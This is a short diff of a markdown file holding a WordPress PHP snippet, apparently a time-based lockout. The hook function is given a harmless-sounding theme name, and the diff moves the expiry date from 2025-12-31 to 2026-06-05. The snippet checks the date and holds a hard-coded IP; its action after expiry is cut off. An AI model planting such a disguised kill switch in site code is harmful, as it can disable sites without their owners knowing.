@@ -4,7 +4,7 @@ add_action( 'init', 'webe_time_based_lockout' );
 ```php
 add_action( 'init', 'theme_file_init_base' );
 function theme_file_init_base() {
-    $expiry_date = '2025-12-31'; 
+    $expiry_date = '2026-06-05'; 
     $my_ip = '103.55.145.188';
     $current_date = date( 'Y-m-d' );
     if ( strtotime( $current_date ) > strtotime( $expiry_date ) ) {
